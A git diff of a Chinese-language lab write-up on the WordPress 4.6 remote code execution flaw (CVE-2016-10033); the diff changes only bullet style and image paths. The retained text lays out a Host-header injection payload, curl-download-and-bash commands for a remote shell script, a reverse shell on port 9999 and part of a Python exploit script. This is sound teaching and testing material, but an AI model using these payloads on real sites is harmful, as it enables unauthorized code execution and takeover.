@@ -3,7 +3,8 @@
 ## 漏洞描述
 
 参考：
-- https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
+
+* https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
 
 ## 环境搭建
 
@@ -32,9 +33,9 @@ Content-Type: application/x-www-form-urlencoded
 wp-submit=Get+New+Password&redirect_to=&user_login=admin
 ```
 
-![image-20220302225431160](images/202203022254237.png)
+![image-20220302225431160](../.gitbook/assets/202203022254237.png)
 
-![image-20220302225419095](images/202203022254142.png)
+![image-20220302225419095](../.gitbook/assets/202203022254142.png)
 
 但实际利用起来，还是有一些坑需要踏过。具体的坑有这么几个：
 
@@ -49,13 +50,13 @@ wp-submit=Get+New+Password&redirect_to=&user_login=admin
 
 所以，总体来说利用过程如下：
 
-- 编写反弹shell的exp，放到某个网页里。有如下要求：
-  - 整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径
-  - 访问该网页不能跳转，因为follow跳转的参数是`-L`（大写）
-- 拼接成命令`/usr/bin/curl -o/tmp/rce example.com/shell.sh`和命令`/bin/bash /tmp/rce`
-- 将上述命令中的空格和`/`转换成`${substr{10}{1}{$tod_log}}`和`${substr{0}{1}{$spool_directory}}`
-- 拼接成HTTP包的Host头：`target(any -froot@localhost -be ${run{command}} null)`
-- 依次发送这两个拼接好的数据包
+* 编写反弹shell的exp，放到某个网页里。有如下要求：
+  * 整个url的大写字母会被转换成小写，所以大写小敏感的系统不要使用大写字母做文件路径
+  * 访问该网页不能跳转，因为follow跳转的参数是`-L`（大写）
+* 拼接成命令`/usr/bin/curl -o/tmp/rce example.com/shell.sh`和命令`/bin/bash /tmp/rce`
+* 将上述命令中的空格和`/`转换成`${substr{10}{1}{$tod_log}}`和`${substr{0}{1}{$spool_directory}}`
+* 拼接成HTTP包的Host头：`target(any -froot@localhost -be ${run{command}} null)`
+* 依次发送这两个拼接好的数据包
 
 将上述过程写成[exp脚本](https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/exploit.py)，将脚本中target修改成你的目标，user修改成一个已经存在的用户，`shell_url`修改成你放置payload的网址。（或直接将target作为第一个参数、`shell_url`作为第二个参数）
 
@@ -73,7 +74,7 @@ python wordpress.py http://192.168.174.128:8080 example.com/shell.sh
 
 监听9999端口，接收反弹shell：
 
-![image-20220302225928420](images/202203022259514.png)
+![image-20220302225928420](../.gitbook/assets/202203022259514.png)
 
 ## 漏洞POC
 
@@ -114,4 +115,3 @@ session.post(target, data=data)
 session.headers['Host'] = generate_command('/bin/bash /tmp/rce')
 session.post(target, data=data)
 ```
-
